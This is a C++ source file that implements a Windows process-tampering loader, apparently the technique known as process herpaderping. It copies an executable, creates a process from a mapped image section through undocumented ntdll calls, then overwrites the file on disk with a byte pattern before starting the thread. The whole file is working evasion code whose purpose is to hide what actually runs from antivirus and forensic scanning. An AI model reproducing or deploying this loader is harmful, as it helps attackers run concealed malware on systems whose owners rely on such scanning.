#include <cstdio>
#include "utils.hpp"

int main() {
    // source
    HANDLE hFileSrc = CreateFileA(
        "mesbox.exe",
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    DWORD shareMode = (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    // target
    HANDLE hFileTar = CreateFileA(
        "output.exe",
        GENERIC_READ | GENERIC_WRITE,
        shareMode,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (!CopyFileByHandle(hFileSrc, hFileTar)) {
        CloseHandle(hFileSrc);
        CloseHandle(hFileTar);
        return -1;
    }
    CloseHandle(hFileSrc);
    hFileSrc = nullptr;

    HMODULE ntdll = GetModuleHandleA("ntdll");
    pNtCreateSection myNtCreateSection = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    HANDLE sectionHandle = nullptr;
    NTSTATUS status = myNtCreateSection(&sectionHandle,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        hFileTar
    );
    if (!NT_SUCCESS(status)) return -1;

    pNtCreateProcessEx myNtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    HANDLE processHandle = nullptr;
    status = myNtCreateProcessEx(
        &processHandle,
        PROCESS_ALL_ACCESS,
        nullptr,
        NtCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        sectionHandle,
        nullptr,
        nullptr,
        0
    );
    printf("Created process object, PID %lu\n", GetProcessId(processHandle));

    CloseHandle(sectionHandle);
    sectionHandle = nullptr;

    DWORD imageEntryPointRva;
    if (!GetImageEntryPointRva(hFileTar, &imageEntryPointRva)) return -1;

    BYTE Pattern[] = { '\x72', '\x6f', '\x66', '\x6c' };
    if (!OverwriteFileContentsWithPattern(hFileTar, Pattern, sizeof(Pattern))) return -1;
    printf("Preparing target for execution\n");

    PROCESS_BASIC_INFORMATION pbi{};
    pNtQueryInformationProcess myNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    status = myNtQueryInformationProcess(
        processHandle,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        nullptr
    );
    if (!NT_SUCCESS(status)) return -1;

    PEB peb{};
    if (!ReadProcessMemory(
            processHandle,
            pbi.PebBaseAddress,
            &peb,
            sizeof(peb),
            nullptr
        )
    ) return -1;

    printf("Writing process parameters, remote PEB ProcessParameters 0x%p\n", Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)));

    if (!WriteRemoteProcessParameters(
            processHandle,
            L"output.exe",
            nullptr,
            nullptr,
            L"\"output.exe\"",
            NtCurrentTeb()->ProcessEnvironmenBlock,
            L"output.exe",
            L"WinSta0\\Default",
            nullptr,
            nullptr
        )
    ) return -1;

    void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);
    printf("Creating thread in process at entry point 0x%p\n", remoteEntryPoint);

    pNtCreateThreadEx myNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    HANDLE threadHandle = nullptr;
    status = myNtCreateThreadEx(
        &threadHandle,
        THREAD_ALL_ACCESS,
        nullptr,
        processHandle,
        remoteEntryPoint,
        nullptr,
        0,
        0,
        0,
        0,
        nullptr
    );
    if (!NT_SUCCESS(status)) return -1;

    printf("Created thread, TID %lu\n", GetThreadId(threadHandle));

    CloseHandle(threadHandle);

    return 0;
}



